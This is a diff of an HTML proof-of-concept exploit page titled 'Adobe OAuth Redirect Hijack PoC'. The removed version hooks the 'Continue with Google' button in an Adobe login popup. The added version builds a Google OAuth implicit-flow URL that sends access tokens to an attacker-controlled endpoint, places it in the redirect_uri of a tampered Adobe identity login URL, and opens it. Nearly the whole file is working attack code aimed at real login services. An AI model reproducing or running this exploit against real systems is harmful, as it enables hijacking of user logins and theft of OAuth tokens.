@@ -1,105 +1,52 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>OAuth COOP PoC</title>
-    <style>
-        body {
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            background-color: #f2f2f2;
-            font-family: Arial, sans-serif;
-            padding: 20px;
-        }
-        img {
-            width: 300px;
-            height: auto;
-        }
-        button {
-            padding: 10px 20px;
-            margin: 10px;
-            background-color: #4caf50;
-            color: white;
-            border: none;
-            cursor: pointer;
-            font-size: 16px;
-        }
-        #log {
-            margin-top: 20px;
-            background: #000;
-            color: #0f0;
-            padding: 10px;
-            font-family: monospace;
-            height: 200px;
-            width: 90%;
-            max-width: 600px;
-            overflow-y: auto;
-            text-align: left;
-        }
-    </style>
-    <script>
-        function log(msg) {
-            document.getElementById("log").innerHTML += msg + "<br>";
-        }
-
-        function buildAttackURL() {
-            let client_id = "50787447880-lej9pu0gkn41t1cacqcisjessmcrt9bf.apps.googleusercontent.com";
-            let redirect_uri = "https://poc-coop.com/store.html"; // change this to your endpoint
-            let scope = "https://www.googleapis.com/auth/userinfo.profile";
-
-            return "https://accounts.google.com/o/oauth2/v2/auth?" +
-                "client_id=" + encodeURIComponent(client_id) +
-                "&redirect_uri=" + encodeURIComponent(redirect_uri) +
-                "&response_type=token" +
-                "&scope=" + encodeURIComponent(scope);
-        }
-
-        let foo;
-        let attackOAuthURL;
-
-        function launchWithHook() {
-            attackOAuthURL = buildAttackURL();
-            let urlParam = new URLSearchParams(window.location.search).get("url");
-            if (!urlParam) {
-                log("❌ Missing ?url= parameter.");
-                return;
-            }
-
-            log("▶ Opening Adobe login: " + urlParam);
-            foo = window.open(urlParam, "foo", "width=600,height=700");
-
-            // Wait a bit, then try to hook the button
-            setTimeout(hookGoogleButton, 3000);
-        }
-
-        function hookGoogleButton() {
-            if (!foo || foo.closed) {
-                log("❌ Popup closed.");
-                return;
-            }
-
-            try {
-                // inject JS into Adobe window if same-origin (PoC simulation)
-                foo.document.addEventListener("click", function(e) {
-                    if (e.target.innerText.includes("Continue with Google")) {
-                        e.preventDefault();
-                        log("⚠ Hijacking Google login → Redirecting to attacker OAuth flow");
-                        foo.location.href = attackOAuthURL;
-                    }
-                }, true);
-
-                log("✅ Hook installed on 'Continue with Google' button.");
-            } catch (e) {
-                log("⚠ Cross-origin block — cannot inject into Adobe window directly. " +
-                    "This part works only if you have injection/XSS in target.");
-            }
-        }
-    </script>
+  <title>Adobe OAuth Redirect Hijack PoC</title>
+  <style>
+    body { font-family: monospace; background: #111; color: #0f0; padding: 20px; }
+    button { padding: 10px 20px; margin-top: 20px; background: #4caf50; color: white; border: none; cursor: pointer; }
+  </style>
 </head>
 <body>
-    <img src="https://media.tenor.com/HQEVMrJMMI0AAAAi/cat-cat-tutu.gif" alt="cat gif">
-    <button onclick="launchWithHook()">Exploit (Hook Google Button)</button>
-    <div id="log"></div>
+  <h2>Adobe OAuth Redirect Hijack PoC</h2>
+  <button onclick="launch()">Exploit</button>
+  <div id="log"></div>
+
+  <script>
+    function log(msg) {
+      document.getElementById("log").innerHTML += msg + "<br>";
+    }
+
+    function buildAttackURL() {
+      // Build Google OAuth attack
+      let client_id = "50787447880-lej9pu0gkn41t1cacqcisjessmcrt9bf.apps.googleusercontent.com";
+      let redirect_uri = "https://poc-coop.com/store.html";
+      let scope = "openid profile email";
+
+      return "https://accounts.google.com/o/oauth2/v2/auth?" +
+        "client_id=" + encodeURIComponent(client_id) +
+        "&redirect_uri=" + encodeURIComponent(redirect_uri) +
+        "&response_type=token" +
+        "&scope=" + encodeURIComponent(scope);
+    }
+
+    function launch() {
+      let attackOAuthURL = buildAttackURL();
+
+      // Inject Google OAuth into Adobe's redirect_uri param
+      let tamperedAdobeURL =
+        "https://auth-light.identity.adobe.com/?" +
+        "client_id=clio-playground-web" +
+        "&response_type=token" +
+        "&redirect_uri=" + encodeURIComponent(attackOAuthURL) +
+        "&environment=prod" +
+        "&locale=en_US" +
+        "&dt=true&wrapper=true&popup=true" +
+        "&asserted_origin=https://firefly.adobe.com";
+
+      log("▶ Opening tampered Adobe login...");
+      window.open(tamperedAdobeURL, "poc", "width=600,height=700");
+    }
+  </script>
 </body>
 </html>
